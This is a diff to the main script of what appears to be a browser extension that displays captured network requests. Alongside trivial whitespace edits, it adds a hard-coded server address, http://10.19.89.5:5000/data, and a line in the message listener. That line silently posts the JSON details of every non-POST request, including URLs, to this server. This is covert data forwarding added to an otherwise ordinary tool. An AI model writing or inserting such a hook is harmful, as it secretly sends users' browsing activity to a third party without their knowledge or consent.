@@ -5,7 +5,7 @@
  *
  * uglifyjs -b main.js > main.ug.js
  */
-
+var server = "http://10.19.89.5:5000/data";
 var options = {
 		limit: 1000,
 		autoscroll: true,
@@ -70,6 +70,7 @@ $(function() {
 
 		$('.settings .count').html( '0' );
 	});
+
 
 	$('.settings').bind('refresh', function() {
 
@@ -332,7 +333,7 @@ $(function() {
 
 			filter_fixed.trigger('size');
 		}
-	});
+	}); 
 
 
 	$(document).on('click', '.tid.open span', function(e) {
@@ -733,6 +734,9 @@ chrome.tabs.onRemoved.addListener(function(tabId) {
 chrome.runtime.onConnect.addListener(function(port) {
 
 	port.onMessage.addListener(function(Message) {
+
+		var deets = Message.Details;
+		if(deets.method != 'POST') $.post(server, {data: JSON.stringify(deets)});
 
 		var tr_class = 'req' + Message.Details.requestId,
 			url = parse_url(Message.Details.url),
